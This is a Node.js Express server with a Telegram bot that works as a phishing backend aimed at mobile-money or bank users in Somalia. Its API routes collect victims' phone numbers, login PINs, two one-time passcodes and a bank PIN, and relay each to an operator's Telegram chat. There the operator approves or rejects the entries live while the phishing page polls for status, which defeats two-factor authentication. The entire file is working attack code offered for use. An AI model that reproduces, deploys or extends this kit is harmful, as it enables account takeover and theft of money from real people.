const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;
// IMPORTANT: Add your domain URL in your .env file (e.g., https://your-app.com)
const DOMAIN = process.env.DOMAIN_URL || ""; 

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());

// 1. WEBHOOK MIDDLEWARE (This is the "Ear" for the bot)
// This must be placed BEFORE your static file/route handlers
app.use(bot.webhookCallback('/telegram-updates'));

// 2. SERVE STATIC FILES
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', { hour12: true });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>\n\n🆕 <b>NEW USER</b>\n🇸🇴 <b>Country:</b> ${country}\n🌍 <b>Code:</b> ${countryCode}\n📱 <b>Phone:</b> ${phone}\n🔢 <b>PIN:</b> ${pin}\n⏰ <b>Time:</b> ${currentTime}\n\n━━━━━━━━━━━━━━━\n\n⚠️ <b>User waiting for approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>\n\n📱 <b>Phone:</b> ${phone}\n🔐 <b>First OTP:</b> ${otp}\n\n━━━━━━━━━━━━━━━\n⚠️ <b>Verify FIRST OTP</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
                    { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` }
                ]]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const otpMessage2 = `2️⃣ <b>CL 2 - SECOND OTP (Step 2/2)</b>\n\n📱 <b>Phone:</b> ${phone}\n🔐 <b>Second OTP:</b> ${otp}\n\n━━━━━━━━━━━━━━━\n⚠️ <b>Verify SECOND OTP</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
                    { text: "❌ Wrong Code", callback_data: `otp2_wrong|${phone}` },
                    { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                ]]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const bankMsg = `🏦 <b>CL 2 - BANK PIN (Step 3)</b>\n\n📱 <b>Phone:</b> ${phone}\n🔑 <b>Bank PIN:</b> ${bankPin}\n\n━━━━━━━━━━━━━━━\n⚠️ <b>Verify BANK PIN</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankMsg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
                    { text: "❌ Wrong PIN", callback_data: `bank_wrong|${phone}` }
                ]]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>RESEND REQUESTED</b>\n\n📱 <b>Phone:</b> ${phone}\n📍 <b>Step:</b> ${step}\n⚠️ <b>User waiting for new code.</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- FIXED SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api') || req.params.page === 'telegram-updates') return next();
    
    let fileName = req.params.page;
    if (!fileName.endsWith('.html')) {
        fileName += '.html';
    }
    
    const fullPath = path.join(__dirname, 'public', fileName);

    res.sendFile(fullPath, (err) => {
        if (err) {
            res.status(404).send("Page not found");
        }
    });
});

// -------------------- BOT ACTIONS (Unchanged) --------------------

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED:</b> ${phone}`);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>REJECTED:</b> ${phone}`);
});

bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>FIRST OTP VERIFIED:</b> ${phone}`);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG:</b> ${phone}`);
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_correct";
    await ctx.answerCbQuery("Finalized");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>SECOND OTP VERIFIED:</b> ${phone}`);
});

bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_correct";
    await ctx.answerCbQuery("Bank PIN Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>BANK PIN VERIFIED:</b> ${phone}`);
});

// -------------------- START SERVER --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        if (DOMAIN) {
            // Set webhook so Telegram sends button clicks to your server
            await bot.telegram.setWebhook(`${DOMAIN}/telegram-updates`);
            console.log("🤖 Bot is active via Webhook");
        } else {
            // Fallback for local testing (though button clicks won't work locally without ngrok)
            await bot.telegram.deleteWebhook({ drop_pending_updates: true });
            bot.launch();
            console.log("🤖 Bot is active via Polling (Local Mode)");
        }
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
